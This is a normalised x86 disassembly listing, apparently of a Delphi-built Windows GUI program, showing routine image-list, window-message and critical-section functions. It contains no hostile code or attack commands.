mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_427e0a
jmp sub_403970
sub_427e1b
jmp sub_4036bc
sub_427e6a
jmp sub_403970
sub_428097
jmp sub_403970
sub_4280df
jmp sub_403970
sub_42824c
jmp sub_403970
sub_428313
jmp sub_4036bc
sub_428368
mov [ eax + 0x31 ] 0x0
call sub_42537c
retn
sub_4285b9
jmp sub_403970
sub_428624
jmp sub_403970
sub_42862b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42869c
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_428750
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_428760
push ebx
mov ebx eax
mov eax ebx
call sub_428918
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_428774
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_428790
push ebx
mov ebx eax
mov eax ebx
call sub_428978
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4287ec
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4288fb
jmp sub_403970
sub_428b5f
jmp sub_4036bc
sub_428bbf
jmp sub_403970
sub_428bc6
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_428fa7
jmp sub_403970
sub_428fd3
jmp sub_403970
sub_42903a
jmp sub_4036bc
sub_42906b
jmp sub_403970
sub_4290f0
jmp sub_4036bc
sub_4290f5
mov eax [ ebp - 0x38 ]
call sub_40321c
call sub_4039d0
call sub_403a24
sub_429107
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429124
mov eax [ ebp - 0x18 ]
call sub_4027ac
retn
sub_42911d
jmp sub_403970
sub_429273
jmp sub_4036bc
sub_42953f
jmp sub_4036bc
sub_4295d0
mov cl 0x1
call sub_4295d8
retn
sub_4298e8
xor ecx ecx
call sub_4295d8
retn
sub_42996a
jmp sub_4036bc
sub_42996f
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4039d0
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4299c0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_429af9
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_429b28
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_429b3c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_429c55
jmp sub_4036bc
sub_429d0a
jmp sub_4036bc
sub_429d74
jmp sub_4036bc
sub_429da8
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_429d34
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_429dc0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424074
retn
mov [ eax + 0x30 ] edx
retn
sub_429dd8
retn
sub_429ddc
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424074
retn
mov [ eax + 0x2c ] edx
retn
sub_429e1c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424074
pop ebp
retn 0x4
sub_429e30
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424074
pop ebp
retn 0x4
sub_429ff0
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_429ffc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42a0a9
jmp sub_403970
sub_42a0b0
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a19b
jmp sub_4036bc
sub_42a207
jmp sub_403970
sub_42a335
jmp sub_403970
sub_42a33c
pop ebp
retn
sub_42a43c
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_42a471
jmp sub_403970
sub_42a478
pop ebp
retn
sub_42a47c
sub [ rw-data ] 0x1
retn
sub_42a6c4
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_41a19c
retn
sub_42a6f8
mov eax [ eax + 0x4 ]
call sub_41a040
retn
sub_42a729
jmp sub_403970
sub_42a730
pop ebp
retn
sub_42a734
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_14(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_14(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_14(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_14(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_14(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ __import_lookup_table_14(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ __import_lookup_table_14(comctl32:ImageList_GetBkColor) ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_14(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ __import_lookup_table_14(comctl32:ImageList_DragShowNolock) ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ __import_lookup_table_14(comctl32:ImageList_Read) ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ __import_lookup_table_14(comctl32:ImageList_SetIconSize) ]
sub_42a8b9
jmp sub_403970
sub_42a8c0
pop ebp
retn
sub_42a8c4
sub [ rw-data ] 0x1
retn
sub_42a98b
jmp sub_403970
sub_42a992
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42afa8
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42a9b4
mov [ rw-data ] sub_42aacc
mov [ rw-data ] sub_42aa3c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42acd0
mov [ rw-data ] sub_42ada4
mov [ rw-data ] sub_42ae78
retn
sub_42b039
jmp sub_403970
sub_42b040
pop ebp
retn
sub_42b044
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42afa8
sub_42b079
jmp sub_403970
sub_42b080
pop ebp
retn
sub_42b084
sub [ rw-data ] 0x1
retn
sub_42b313
add eax 0xffffffd4
jmp sub_42be40
sub_42b31b
add eax 0xffffffd4
jmp sub_42be9c
sub_42b32d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a70
sub_42b4c6
jmp sub_403970
sub_42b4cd
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b6dd
jmp sub_403970
sub_42b6e4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b899
jmp sub_403970
sub_42b8fe
jmp sub_403970
sub_42b905
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b9f1
jmp sub_403970
sub_42b9f8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42bc08
lea eax [ ebp - 0x30 ]
call sub_403f6c
lea eax [ ebp - 0x20 ]
call sub_403f6c
retn
sub_42bc19
jmp sub_403970
j_sub_42bc08
jmp sub_42bc08
sub_42bc20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bd1b
jmp sub_403970
sub_42bd22
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42be1f
jmp sub_403970
sub_42be26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42be86
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_42be8f
jmp sub_403970
j_sub_42be86
jmp sub_42be86
sub_42be96
pop ebx
pop ecx
pop ebp
retn
sub_42bf31
jmp sub_403970
sub_42bf38
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42bf44
mov eax [ eax + 0x20 ]
retn
sub_42c073
jmp sub_403970
sub_42c07a
pop ebp
retn
sub_42c07c
sub [ rw-data ] 0x1
retn
sub_42c0a9
jmp sub_403970
sub_42c0b0
pop ebp
retn
sub_42c0b4
sub [ rw-data ] 0x1
retn
sub_42c0ed
jmp sub_403970
sub_42c0f4
pop ebp
retn
sub_42c0f8
sub [ rw-data ] 0x1
retn
sub_42c405
jmp sub_403970
sub_42c40c
pop ebp
retn
sub_42c410
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c15c
sub_42c4f0
retn
sub_42c564
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42c570
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42c57c
mov edx [ eax ]
call [ edx ]
retn
sub_42c584
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42c5b1
jmp sub_403970
sub_42c5b8
pop ebp
retn
sub_42c5bc
sub [ rw-data ] 0x1
retn
sub_42c77b
jmp sub_403970
sub_42c782
pop ebp
retn
sub_42cb37
jmp sub_403970
sub_42cb3e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42cf58
jmp sub_403970
sub_42cf5f
pop ebp
retn
sub_42cf64
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c4f4
mov [ rw-data ] eax
sub_42cfa5
jmp sub_403970
sub_42cfac
pop ebp
retn
sub_42cfb0
sub [ rw-data ] 0x1
retn
sub_42cfdd
jmp sub_403970
sub_42cfe4
pop ebp
retn
sub_42cfe8
sub [ rw-data ] 0x1
retn
sub_42d015
jmp sub_403970
sub_42d01c
pop ebp
retn
sub_42d020
sub [ rw-data ] 0x1
retn
sub_42d04d
jmp sub_403970
sub_42d054
pop ebp
retn
sub_42d058
sub [ rw-data ] 0x1
retn
sub_42d085
jmp sub_403970
sub_42d08c
pop ebp
retn
sub_42d090
sub [ rw-data ] 0x1
retn
sub_42d0bd
jmp sub_403970
sub_42d0c4
pop ebp
retn
sub_42d0c8
sub [ rw-data ] 0x1
retn
sub_42d0f5
jmp sub_403970
sub_42d0fc
pop ebp
retn
sub_42d100
sub [ rw-data ] 0x1
retn
sub_42d12d
jmp sub_403970
sub_42d134
pop ebp
retn
sub_42d138
sub [ rw-data ] 0x1
retn
sub_42d165
jmp sub_403970
sub_42d16c
pop ebp
retn
sub_42d170
sub [ rw-data ] 0x1
retn
sub_42d3ea
jmp sub_4036bc
sub_42d3ef
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d40c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42d414
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403418
pop esi
retn
sub_42d42c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403418
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42d444
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42d4ed
jmp sub_403970
sub_42d51b
jmp sub_403970
sub_42d522
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d52c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42d540
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42d79e
jmp sub_403970
sub_42d7a5
pop ebp
retn
sub_42ebc0
push esi
mov esi eax
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ebdc
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f072
jmp sub_4036bc
sub_42f12b
jmp sub_403970
sub_42f132
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f138
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42f0ac
sub_42f148
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42f0ac
sub_42f158
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42f0ac
pop ebp
retn 0x8
sub_42f170
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42f29c
push ebx
mov ebx eax
mov eax ebx
call sub_446664
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f2b0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f2e4
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42f3e8
jmp sub_403970
sub_42f3ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f592
jmp sub_403970
sub_42f599
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f5a3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f5b8
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_44394c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f5d4
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_44394c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f5f0
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_44394c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f60c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_44394c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f628
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44462c
sub_42f63c
mov al [ eax + 0x220 ]
retn
sub_42f7a5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42f7bd
jmp sub_403970
sub_42ff6b
jmp sub_403970
sub_42ffd8
jmp sub_403970
sub_4300f4
push ebx
lea ebx [ eax + 0x190 ]
push ebx
lea ebx [ eax + 0x1ac ]
push ebx
call sub_430020
pop ebx
retn
sub_430240
mov [ eax + 0x16d ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4305ef
retn
sub_4305f0
jmp sub_403970
j_sub_4305ef
jmp sub_4305ef
sub_4305f7
pop ebp
retn
sub_4305fc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403cf4
mov eax [ r-xdata ]
call sub_4199d8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
sub_430659
jmp sub_403970
sub_430660
pop ebp
retn
sub_430664
sub [ rw-data ] 0x1
retn
sub_43069d
jmp sub_403970
sub_4306a4
pop ebp
retn
sub_4306a8
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_430724
retn
sub_430725
jmp sub_403970
j_sub_430724
jmp sub_430724
sub_43072c
pop ebp
retn
sub_430730
sub [ rw-data ] 0x1
retn
sub_430738
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_40321c
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_4307fc
jmp sub_403970
sub_430803
pop ebp
retn
sub_430808
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_430754
call sub_403d40
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c30
sub_430855
jmp sub_403970
sub_43085c
pop ebp
retn
sub_430860
sub [ rw-data ] 0x1
retn
sub_4308bc
jmp sub_403970
sub_4308c3
pop ebp
retn
sub_4308c8
sub [ rw-data ] 0x1
retn
sub_430924
jmp sub_403970
sub_43092b
pop ebp
retn
sub_430930
sub [ rw-data ] 0x1
retn
sub_430991
jmp sub_403970
sub_430998
pop ebp
retn
sub_43099c
sub [ rw-data ] 0x1
retn
sub_4309e8
jmp sub_403970
sub_4309ef
pop ebp
retn
sub_4309f4
sub [ rw-data ] 0x1
retn
sub_430a21
jmp sub_403970
sub_430a28
pop ebp
retn
sub_430a2c
sub [ rw-data ] 0x1
retn
sub_4313c0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c15c
mov [ rw-data ] eax
sub_4313f5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_43140c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_431738
push esi
mov [ eax + 0x218 ] dx
mov [ eax + 0x21a ] cx
mov si 0xffb3
call sub_403418
pop esi
retn
sub_4317f4
cmp [ eax + 0x228 ] 0x1
jne r-xdata
mov dl 0x1
call sub_431dbc
retn
xor edx edx
call sub_431dbc
retn
sub_431848
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_431a76
jmp sub_403970
sub_431a7d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431d38
jmp sub_403970
sub_431d3f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431f1b
jmp sub_403970
sub_431f22
pop ebp
retn
sub_431f24
sub [ rw-data ] 0x1
retn
sub_431f93
jmp [ edi ]
sub_432234
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43224c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_432290
push ebx
mov ebx eax
mov eax ebx
call sub_4329b8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_4329a7
jmp sub_403970
sub_4329b8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42cee8
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_432260
sub_432a0f
jmp sub_403970
sub_432a16
pop ebp
retn
sub_432a18
sub [ rw-data ] 0x1
retn
sub_4342df
[ eax + eax ]
sub_436843
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x293d172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_436bfe
jmp sub_403970
sub_436c05
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436c8a
jmp sub_403970
sub_436c91
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436c98
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44394c
pop ebx
retn
sub_436cac
push ebx
mov ebx eax
mov eax ebx
call sub_4466a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44394c
pop ebx
retn
sub_436cc8
push ebx
mov ebx eax
mov eax ebx
call sub_445678
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_436d74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4408a4
pop esi
pop ebx
retn
sub_436ede
jmp sub_403970
sub_436ee5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436ff4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_442960
mov eax ebx
mov si 0xffc7
call sub_403418
pop esi
pop ebx
retn
sub_4370e0
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4370fc
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403418
sub_437118
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_437124
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41fc0c
sub_437138
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437198
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43720c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403418
pop esi
pop ebx
retn
sub_437228
push esi
mov esi eax
mov eax esi
call sub_44246c
mov eax esi
mov si 0xffc7
call sub_403418
pop esi
retn
sub_4372cd
jmp sub_403970
sub_4372d4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4372dc
push ebx
mov ebx eax
mov eax ebx
call sub_4425d0
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_437300
push ebx
mov ebx eax
mov eax ebx
call sub_4425e8
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_4373ec
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_4379f8
sub_437400
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_4379f8
mov eax ebx
call sub_44462c
sub_437424
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_44462c
sub_437438
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_44462c
sub_43747c
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_44462c
sub_43757d
jmp sub_403970
sub_437584
pop ebx
pop ecx
pop ebp
retn
sub_43769c
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_4470c4
push eax
call SetWindowTextA
pop ebx
retn
sub_4376b8
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ebx
retn
sub_43775e
jmp sub_403970
sub_437765
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4377fe
jmp sub_403970
sub_437977
jmp sub_403970
sub_4379dc
push ebx
mov ebx eax
mov eax ebx
call sub_437490
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_444428
pop ebx
retn
sub_437adc
push ebx
mov ebx eax
mov eax ebx
call sub_4404b0
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_437bd4
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403418
sub_437d36
jmp sub_403970
sub_437de0
mov eax [ r-xdata ]
retn
sub_437de8
xor eax eax
retn
sub_437dec
retn
sub_437f04
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44462c
sub_437f7c
push ebx
mov ebx eax
mov eax ebx
call sub_4576d8
test eax eax
je r-xdata
mov eax ebx
call sub_441de0
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_437fa0
xor eax eax
retn
sub_438067
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x402d173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_438080
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403418
sub_438171
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_43817a
jmp sub_403970
j_sub_438171
jmp sub_438171
sub_438181
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438254
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_4470c4
push eax
call SendMessageA
pop ebx
retn
sub_438334
jmp sub_403970
sub_43833b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4383c7
jmp sub_403970
sub_4383ce
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43850d
jmp sub_403970
sub_438514
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4385a9
jmp sub_403970
sub_4385b0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4385b8
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_403418
pop esi
retn
sub_4386f6
jmp sub_403970
sub_438718
jmp sub_403970
sub_43871f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438728
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_403418
pop esi
retn
sub_438892
jmp sub_403970
sub_4388af
jmp sub_403970
sub_4388b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438a59
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_438a67
jmp sub_403970
j_sub_438a59
jmp sub_438a59
sub_438a6e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438abc
push esi
mov si 0xffb1
call sub_403418
pop esi
retn
sub_438ac8
push esi
mov si 0xffb0
call sub_403418
pop esi
retn
sub_438b1c
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_438c87
jmp sub_403970
sub_438c8e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438dd8
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_438dfc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ebx
retn
sub_438e64
cmp dl [ eax + 0x23b ]
je r-xdata
retn
mov [ eax + 0x23b ] dl
call sub_44462c
sub_438ee4
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_44462c
sub_438efc
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_44462c
sub_438f18
